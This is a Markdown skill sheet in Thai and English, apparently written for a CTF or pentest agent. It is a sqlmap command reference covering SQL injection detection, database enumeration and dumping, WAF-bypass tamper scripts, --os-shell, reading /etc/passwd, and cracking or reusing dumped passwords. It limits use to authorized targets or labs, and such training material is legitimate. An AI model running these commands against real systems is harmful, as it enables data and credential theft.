# Skill: SQLMap

## Purpose
Automated SQL Injection detection และ exploitation — ทดสอบและ dump database จากช่องโหว่ SQL Injection

## When to Use
- Phase: Exploitation
- พบ potential SQL Injection ใน parameter (error message, หรือ behavior ต่างกัน)
- ต้องการ enumerate หรือ dump database
- ใช้บน authorized targets เท่านั้น

## Installation
```bash
sudo apt install sqlmap
# หรือ
pip install sqlmap
```

## Command Reference

### Basic Detection
```bash
# GET parameter
sqlmap -u "http://target.com/page?id=1"

# หลาย parameters → ระบุ parameter ที่ต้องการ test
sqlmap -u "http://target.com/page?id=1&page=2" -p id
```

### POST Request
```bash
# ระบุ data
sqlmap -u "http://target.com/login" --data="username=test&password=test"

# จาก Burp request file
sqlmap -r request.txt
```

### Cookie-based Injection
```bash
sqlmap -u "http://target.com/" --cookie="session=abc123; id=1" -p id
```

### Enumerate Databases
```bash
# List all databases
sqlmap -u "http://target.com/page?id=1" --dbs --batch

# List tables ใน database
sqlmap -u "http://target.com/page?id=1" -D <dbname> --tables --batch

# List columns ใน table
sqlmap -u "http://target.com/page?id=1" -D <dbname> -T <tablename> --columns --batch

# Dump table data
sqlmap -u "http://target.com/page?id=1" -D <dbname> -T <tablename> --dump --batch

# Dump specific columns
sqlmap -u "http://target.com/page?id=1" -D <dbname> -T users -C username,password --dump --batch
```

### Flags อธิบาย

| Flag | ความหมาย |
|------|---------|
| `--batch` | Auto-answer all prompts (ไม่ต้องกด Y/N) |
| `--dbs` | Enumerate databases |
| `-D <db>` | ระบุ database |
| `-T <table>` | ระบุ table |
| `-C <cols>` | ระบุ columns |
| `--dump` | Dump data |
| `--level=5` | ระดับ test ละเอียดขึ้น (1-5) |
| `--risk=3` | Risk level สูงขึ้น (1-3) — ใช้บน lab เท่านั้น |
| `--technique=U` | Union-based only |
| `--dbms=mysql` | ระบุ database type |
| `--forms` | Auto-detect forms บน page |
| `--crawl=2` | Crawl website |
| `--os-shell` | ลอง get OS shell (ถ้า privileges พอ) |
| `--file-read=/etc/passwd` | อ่านไฟล์จาก server |
| `-v 3` | Verbose output |

### เพิ่ม Header / Authentication
```bash
# Authorization header
sqlmap -u "http://target.com/api/users?id=1" -H "Authorization: Bearer <token>"

# ผ่าน login ก่อน (session-based)
sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=<session_id>"
```

### WAF Bypass
```bash
# Tamper scripts
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment
sqlmap -u "http://target.com/page?id=1" --tamper=between,randomcase
sqlmap -u "http://target.com/page?id=1" --tamper=charencode  # URL encode

# ดู tamper scripts ทั้งหมด
sqlmap --list-tampers
```

## Output ที่ต้องสังเกต

```
[INFO] the back-end DBMS is MySQL          → รู้ว่าเป็น MySQL
[INFO] GET parameter 'id' is vulnerable    → พบช่องโหว่
[INFO] retrieved: 3                        → จำนวน databases
available databases [3]:
[*] information_schema
[*] mysql
[*] target_db                              → น่าสนใจ!
```

## วิธีใช้ใน CTF Workflow
1. ตรวจพบ parameter ที่ suspicious จาก gobuster/manual
2. ลอง manual injection ก่อน (`'`, `' OR 1=1--`)
3. ถ้าดูน่าจะมีช่องโหว่ → รัน sqlmap --dbs
4. เมื่อ enumerate databases แล้ว → หา database ที่น่าสนใจ
5. Dump users/passwords table → crack หรือใช้ login
6. บันทึก credential ใน session.md → Findings

## หมายเหตุด้านความปลอดภัย
- ใช้บน authorized targets หรือ lab เท่านั้น
- `--risk=3 --level=5` อาจทำให้ server ช้า ใช้ด้วยความระมัดระวัง
- `--os-shell` ต้องการ database user ที่มี FILE privilege
